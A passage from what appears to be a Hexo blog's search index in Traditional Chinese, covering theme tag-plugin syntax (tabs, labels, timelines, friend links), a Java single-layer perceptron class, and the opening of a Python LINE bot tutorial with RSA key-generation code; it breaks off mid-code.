&quot;Calcium&quot; : 42.96    &quot;Potassium&quot; : 50.05    &quot;Magnesium&quot; : 10.01    &quot;Iron&quot; :  5  </pre></div><h3 id="tabs"><a class="markdownIt-Anchor" href="#tabs"></a> Tabs</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% tabs Unique name, [index] %&#125;</span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line">Any content (support inline tags too).</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br><span class="line"></span><br><span class="line">Unique name   : Unique name of tabs block tag without comma.</span><br><span class="line">                Will be used in #id&#x27;s as prefix for each tab with their index numbers.</span><br><span class="line">                If there are whitespaces in name, for generate #id all whitespaces will replaced by dashes.</span><br><span class="line">                Only for current url of post/page must be unique!</span><br><span class="line">[index]       : Index number of active tab.</span><br><span class="line">                If not specified, first tab (1) will be selected.</span><br><span class="line">                If index is -1, no tab will be selected. It&#x27;s will be something like spoiler.</span><br><span class="line">                Optional parameter.</span><br><span class="line">[Tab caption] : Caption of current tab.</span><br><span class="line">                If not caption specified, unique name with tab index suffix will be used as caption of tab.</span><br><span class="line">                If not caption specified, but specified icon, caption will empty.</span><br><span class="line">                Optional parameter.</span><br><span class="line">[@icon]       : FontAwesome icon name (full-name, look like &#x27;fas fa-font&#x27;)</span><br><span class="line">                Can be specified with or without space; e.g. &#x27;Tab caption @icon&#x27; similar to &#x27;Tab caption@icon&#x27;.</span><br><span class="line">                Optional parameter.</span><br></pre></td></tr></table></figure><p>實際使用大概像是這樣</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line">**This is Tab 1.**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line">**This is Tab 2.**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line">**This is Tab 3.**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">test1 1</button></li><li class="tab"><button type="button" data-href="#test1-2">test1 2</button></li><li class="tab"><button type="button" data-href="#test1-3">test1 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% tabs test4 %&#125;</span><br><span class="line">&lt;!-- tab 第一個Tab --&gt;</span><br><span class="line">**tab名字為第一個Tab**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab @fab fa-apple-pay --&gt;</span><br><span class="line">**只有圖標 沒有Tab名字**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 炸彈@fas fa-bomb --&gt;</span><br><span class="line">**名字+icon**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><div class="tabs" id="test4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test4-1">第一個Tab</button></li><li class="tab"><button type="button" data-href="#test4-2"><i class="fab fa-apple-pay" style="text-align: center;"></i></button></li><li class="tab"><button type="button" data-href="#test4-3"><i class="fas fa-bomb"></i>炸彈</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test4-1"><p><strong>tab名字為第一個Tab</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-2"><p><strong>只有圖標 沒有Tab名字</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-3"><p><strong>名字+icon</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="內嵌圖片"><a class="markdownIt-Anchor" href="#內嵌圖片"></a> 內嵌圖片</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% inlineImg [src] [height] %&#125;</span><br><span class="line"></span><br><span class="line">[src]      :    圖片鏈接</span><br><span class="line">[height]   ：   圖片高度限制【可選】</span><br></pre></td></tr></table></figure><h3 id="highlight"><a class="markdownIt-Anchor" href="#highlight"></a> highlight</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% label text color %&#125;</span><br></pre></td></tr></table></figure><p>參數解釋<br />text文字<br />color【可選】背景顏色，默認為 default(default/blue/pink/red/purple/orange/green)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">臣亮言：&#123;% label 先帝 %&#125;創業未半，而&#123;% label 中道崩殂 blue %&#125;。今天下三分，&#123;% label 益州疲敝 pink %&#125;，此誠&#123;% label 危急存亡之秋 red %&#125;也！然侍衞之臣，不懈於內；&#123;% label 忠志之士 purple %&#125;，忘身於外者，蓋追先帝之殊遇，欲報之於陛下也。誠宜開張聖聽，以光先帝遺德，恢弘志士之氣；不宜妄自菲薄，引喻失義，以塞忠諫之路也。</span><br><span class="line">宮中、府中，俱為一體；陟罰臧否，不宜異同。若有&#123;% label 作奸 orange %&#125;、&#123;% label 犯科 green %&#125;，及為忠善者，宜付有司，論其刑賞，以昭陛下平明之治；不宜偏私，使內外異法也。</span><br></pre></td></tr></table></figure><p>臣亮言：<mark class="hl-label default">先帝</mark> 創業未半，而<mark class="hl-label blue">中道崩殂</mark> 。今天下三分，<mark class="hl-label pink">益州疲敝</mark> ，此誠<mark class="hl-label red">危急存亡之秋</mark> 也！然侍衞之臣，不懈於內；<mark class="hl-label purple">忠志之士</mark> ，忘身於外者，蓋追先帝之殊遇，欲報之於陛下也。誠宜開張聖聽，以光先帝遺德，恢弘志士之氣；不宜妄自菲薄，引喻失義，以塞忠諫之路也。<br />宮中、府中，俱為一體；陟罰臧否，不宜異同。若有<mark class="hl-label orange">作奸</mark> 、<mark class="hl-label green">犯科</mark> ，及為忠善者，宜付有司，論其刑賞，以昭陛下平明之治；不宜偏私，使內外異法也。</p><h3 id="timeline"><a class="markdownIt-Anchor" href="#timeline"></a> timeline</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% timeline title,color %&#125;</span><br><span class="line">&lt;!-- timeline title --&gt;</span><br><span class="line">xxxxx</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&lt;!-- timeline title --&gt;</span><br><span class="line">xxxxx</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><p>參數解釋<br />title標題/時間線<br />colortimeline 顏色(default(留空) / blue / pink / red / purple / orange / green)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% timeline 2022 %&#125;</span><br><span class="line">&lt;!-- timeline 01-02 --&gt;</span><br><span class="line">這是測試頁面</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><div class="timeline undefined"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-02</p></div></div><div class='timeline-item-content'><p>這是測試頁面</p></div></div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% timeline 2022,red %&#125;</span><br><span class="line">&lt;!-- timeline 01-02 --&gt;</span><br><span class="line">這是測試頁面</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><div class="timeline red"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-02</p></div></div><div class='timeline-item-content'><p>這是測試頁面</p></div></div></div><h3 id="flink-友情連結"><a class="markdownIt-Anchor" href="#flink-友情連結"></a> flink 友情連結</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% flink %&#125;</span><br><span class="line">- class_name: 友情鏈接</span><br><span class="line">  class_desc: 那些人，那些事</span><br><span class="line">  link_list:</span><br><span class="line">    - name: JerryC</span><br><span class="line">      link: https://jerryc.me/</span><br><span class="line">      avatar: https://jerryc.me/img/avatar.png</span><br><span class="line">      descr: 今日事,今日畢</span><br><span class="line">    - name: Hexo</span><br><span class="line">      link: https://hexo.io/zh-tw/</span><br><span class="line">      avatar: https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg</span><br><span class="line">      descr: 快速、簡單且強大的網誌框架</span><br><span class="line"></span><br><span class="line">- class_name: 網站</span><br><span class="line">  class_desc: 值得推薦的網站</span><br><span class="line">  link_list:</span><br><span class="line">    - name: Youtube</span><br><span class="line">      link: https://www.youtube.com/</span><br><span class="line">      avatar: https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png</span><br><span class="line">      descr: 視頻網站</span><br><span class="line">    - name: Weibo</span><br><span class="line">      link: https://www.weibo.com/</span><br><span class="line">      avatar: https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png</span><br><span class="line">      descr: 中國最大社交分享平台</span><br><span class="line">    - name: Twitter</span><br><span class="line">      link: https://twitter.com/</span><br><span class="line">      avatar: https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png</span><br><span class="line">      descr: 社交分享平台</span><br><span class="line">&#123;% endflink %&#125;</span><br></pre></td></tr></table></figure><div class="flink"><div class="flink-name">友情鏈接</div><div class="flink-desc">那些人，那些事</div> <div class="flink-list">          <div class="flink-list-item">            <a href="https://jerryc.me/" title="JerryC" target="_blank">              <div class="flink-item-icon">                <img class="no-lightbox" src="https://jerryc.me/img/avatar.png" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="JerryC" />              </div>              <div class="flink-item-name">JerryC</div>               <div class="flink-item-desc" title="今日事,今日畢">今日事,今日畢</div>            </a>          </div>          <div class="flink-list-item">            <a href="https://hexo.io/zh-tw/" title="Hexo" target="_blank">              <div class="flink-item-icon">                <img class="no-lightbox" src="https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="Hexo" />              </div>              <div class="flink-item-name">Hexo</div>               <div class="flink-item-desc" title="快速、簡單且強大的網誌框架">快速、簡單且強大的網誌框架</div>            </a>          </div></div><div class="flink-name">網站</div><div class="flink-desc">值得推薦的網站</div> <div class="flink-list">          <div class="flink-list-item">            <a href="https://www.youtube.com/" title="Youtube" target="_blank">              <div class="flink-item-icon">                <img class="no-lightbox" src="https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="Youtube" />              </div>              <div class="flink-item-name">Youtube</div>               <div class="flink-item-desc" title="視頻網站">視頻網站</div>            </a>          </div>          <div class="flink-list-item">            <a href="https://www.weibo.com/" title="Weibo" target="_blank">              <div class="flink-item-icon">                <img class="no-lightbox" src="https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="Weibo" />              </div>              <div class="flink-item-name">Weibo</div>               <div class="flink-item-desc" title="中國最大社交分享平台">中國最大社交分享平台</div>            </a>          </div>          <div class="flink-list-item">            <a href="https://twitter.com/" title="Twitter" target="_blank">              <div class="flink-item-icon">                <img class="no-lightbox" src="https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="Twitter" />              </div>              <div class="flink-item-name">Twitter</div>               <div class="flink-item-desc" title="社交分享平台">社交分享平台</div>            </a>          </div></div></div>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java 單層感知機實作</title>
      <link href="/perceptron/"/>
      <url>/perceptron/</url>
      
        <content type="html"><![CDATA[<p>因為類神經網路課程順便寫的，盡量簡潔和只使用單一 class，開箱即用，希望可以幫助到大家。</p><p>氣死網路上完全查不到這類型的相關程式碼乾脆自己發。</p><span id="more"></span><p>底下就是單層感知機的實作</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 單層感知機</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Afan Chen</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Perceptron</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="variable">eta</span> <span class="operator">=</span> <span class="number">0.01</span>;    <span class="comment">//學習率</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">nIter</span> <span class="operator">=</span> <span class="number">50</span>;       <span class="comment">//迭代次數</span></span><br><span class="line">    <span class="keyword">private</span> ArrayList&lt;Integer&gt; errors;   <span class="comment">//預測錯誤數量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span>[] w;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用預設學習率的建構子</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Perceptron</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 建構子</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> eta 學習率</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> nIter 迭代次數</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Perceptron</span><span class="params">(<span class="type">double</span> eta, <span class="type">int</span> nIter)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.eta = eta;</span><br><span class="line">        <span class="built_in">this</span>.nIter = nIter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根據設定的eta跟迭代次數進行訓練</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> y label</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fit</span><span class="params">(<span class="type">double</span>[][] x, <span class="type">double</span>[] y)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        w = <span class="keyword">new</span> <span class="title class_">double</span>[x[<span class="number">0</span>].length + <span class="number">1</span>];</span><br><span class="line">        errors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; w.length; i++) &#123;</span><br><span class="line">            w[i] = random.nextGaussian();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nIter; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">error</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; y.length; j++) &#123;</span><br><span class="line">                <span class="type">double</span> <span class="variable">update</span> <span class="operator">=</span> eta * (y[j] - predict(x[j]));<span class="comment">//更新權重值</span></span><br><span class="line">                w[w.length - <span class="number">1</span>] += update;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; x[j].length; k++) &#123;</span><br><span class="line">                    w[k] += update * x[j][k];</span><br><span class="line">                &#125;</span><br><span class="line">                error += update != <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            errors.add(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用來給我存取訓練過程中有多少的訓練錯誤</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">epochError</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 其實是update，只是我拿來畫迭代瞬間的圖</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> y label</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> w weight</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> new weight</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span>[] epoch(<span class="type">double</span>[][] x, <span class="type">double</span>[] y, <span class="type">double</span>[] w) &#123;</span><br><span class="line">        <span class="built_in">this</span>.w = w;</span><br><span class="line">        epochError = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; y.length; j++) &#123;</span><br><span class="line">            <span class="type">double</span> <span class="variable">update</span> <span class="operator">=</span> eta * (y[j] - predict(x[j]));<span class="comment">//更新權重值</span></span><br><span class="line">            w[w.length - <span class="number">1</span>] += update;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; x[j].length; k++) &#123;</span><br><span class="line">                w[k] += update * x[j][k];</span><br><span class="line">            &#125;</span><br><span class="line">            epochError += update != <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> w;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 雖然念起來是內積，但要注意他有先加上weights的最後一項(常數項)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x 單筆data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 內積結果加上常數項</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="title function_">dot</span><span class="params">(<span class="type">double</span>[] x)</span> &#123;</span><br><span class="line">        <span class="type">double</span> <span class="variable">pred</span> <span class="operator">=</span> w[x.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; x.length; i++) &#123;</span><br><span class="line">            pred += x[i] * w[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pred;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 因為我要畫迭代的圖就又創了這個，把權重部分獨立出來</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x 單筆data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> weight 要傳入的權重</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 內積結果加上常數項</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="title function_">dot</span><span class="params">(<span class="type">double</span>[] x, <span class="type">double</span>[] weight)</span> &#123;</span><br><span class="line">        <span class="type">double</span> <span class="variable">pred</span> <span class="operator">=</span> weight[x.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; x.length; i++) &#123;</span><br><span class="line">            pred += x[i] * weight[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pred;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 預測出結果是1 or -1</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x 單筆data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 1 or -1 的預測值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">predict</span><span class="params">(<span class="type">double</span>[] x)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> dot(x) &gt;= <span class="number">0</span> ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 預測出結果是1 or -1</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x 單筆data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 1 or -1 的預測值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">predict</span><span class="params">(<span class="type">double</span>[] x, <span class="type">double</span>[] w)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> dot(x, w) &gt;= <span class="number">0</span> ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 把用fit function訓練出來過程紀錄的error list取出來</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> error list</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title function_">getErrors</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> errors;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 獲取 weight</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> weight</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span>[] getW() &#123;</span><br><span class="line">        <span class="keyword">return</span> w;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 設定 weight</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> w weight</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setW</span><span class="params">(<span class="type">double</span>[] w)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.w = w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概就這樣，不要拿走說是自己寫的就好。</p>]]></content>
      
      
      <categories>
          
          <category> 機器學習 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用 python 快速進行 line bot 開發</title>
      <link href="/line-bot-developers-1/"/>
      <url>/line-bot-developers-1/</url>
      
        <content type="html"><![CDATA[<p>最近小摸了一下 line bot 的技術，老實說還算簡單好玩，但是感覺雷有點多，就乾脆自己寫了一篇簡單的初階教學。(x)</p><p>簡單的部分我跳過了，不然字數會太多，主要會圍繞在<a href="https://developers.line.biz/en/docs/"> line bot 官方文件</a>的解讀上，由於這種文章都會有時效性，如果不能照著做的話請通知我，雖然我也不一定會更新就是了，也歡迎直接觀看 document。</p><p>首先，來看看 Line 給開發者進行 API 對接的模式。</p><img src="/line-bot-developers-1/channel-access-token.png" class=""><span id="more"></span><p>從上圖中，可以很清楚的看到 line bot 中伺服器如何與 line server 進行對接和保障對話的安全性。</p><p>首先，大家請到 <a href="https://developers.line.biz/console">line的開發者平台</a> 上面驗證和註冊。</p><p>資料隨便填，註冊過程歡迎觀看 [30 天教你如何玩弄 Line bot API] 第 1 天：玩弄 Line bot API 第一步](<a href="https://ithelp.ithome.com.tw/articles/10215656">https://ithelp.ithome.com.tw/articles/10215656</a>)。</p><p>註冊完全不是問題點，創建好 line bot 之後會給你必要的 token 等等，如果需要另外創建的話，可以另外使用 Assertion Signing Key ，生成可以到 <a href="https://mkjwk.org/">https://mkjwk.org/</a> 此網站進行。</p><img src="/line-bot-developers-1/RSA256_generator.png" class=""><p>按照這樣子選完之後將 public key 複製到 Assertion Signing Key 的申請欄位就好。</p><p>或者是可以在 Chrome 內的 js 控制台中輸入以下 code 並運行來生成。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> pair = <span class="keyword">await</span> crypto.<span class="property">subtle</span>.<span class="title function_">generateKey</span>(</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;RSASSA-PKCS1-v1_5&#x27;</span>,</span><br><span class="line">      <span class="attr">modulusLength</span>: <span class="number">2048</span>,</span><br><span class="line">      <span class="attr">publicExponent</span>: <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]),</span><br><span class="line">      <span class="attr">hash</span>: <span class="string">&#x27;SHA-256&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="literal">true</span>,</span><br><span class="line">    [<span class="string">&#x27;sign&#x27;</span>, <span class="string">&#x27;verify&#x27;</span>]</span><br><span class="line">  );</span><br><span class="line">   </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;=== private key ===&#x27;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> crypto.<span class="property">subtle</span>.<span class="title function_">exportKey</span>(<span class="string">&#x27;jwk&#x27;</span>, pair.<span class="property">privateKey</span>), <span class="literal">null</span>, <span class="string">&#x27;  &#x27;</span>));</span><br><span class="line">   </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;=== public key ===&#x27;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> crypto.<span class="property">subtle</span>.<span class="title function_">exportKey</span>(<span class="string">&#x27;jwk&#x27;</span>, pair.<span class="property">publicKey</span>), <span class="literal">null</span>, <span class="string">&#x27;  &#x27;</span>)); </span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>以下是本地端伺服器跟 line server 進行交互的架構圖。</p><img src="/line-bot-developers-1/channel-access-token-issue-flow.svg" class=""><p>不過這是非必要的啦，一般來說採用系統給的 channel-access-token 就行。</p><p>我一開始是用 js 摸的，後來覺得 python 比較熟一點就改用 python 了，接下來會講到如何在本地端搭起一個 server 來回應傳來的資訊。</p><p>我先介紹一下 python 要做哪些動作才能進行自動回覆訊息的功能。</p><h3 id="先建立一個-python-的虛擬環境"><a class="markdownIt-Anchor" href="#先建立一個-python-的虛擬環境"></a> 先建立一個 python 的虛擬環境</h3><p>我是用 pychorm IDE 的自動建置虛擬環境，比較簡單一點，如果你是新手，也歡迎直接使用 pychorm，建置版本要求 Python &gt;= 2.7 or &gt;= 3.4，為求穩定和後續開發的間容性我使用3.7。</p><h3 id="下載-line-bot-sdk"><a class="markdownIt-Anchor" href="#下載-line-bot-sdk"></a> 下載 line-bot-sdk 。</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install line-bot-sdk</span><br></pre></td></tr></table></figure><h3 id="輸入程式碼"><a class="markdownIt-Anchor" href="#輸入程式碼"></a> 輸入程式碼</h3><p>以下由 line bot 的官方說明文件範例進行小改寫後講解，先隨便建立一個.py檔案將以下程式碼輸入。</p><p><a href="https://github.com/line/line-bot-sdk-python">官方 github</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> unicode_literals</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"><span class="keyword">from</span> linebot <span class="keyword">import</span> (</span><br><span class="line">    LineBotApi, WebhookParser</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> linebot.exceptions <span class="keyword">import</span> (</span><br><span class="line">    InvalidSignatureError</span><br><span class="line">)</span><br><span class="line"><span 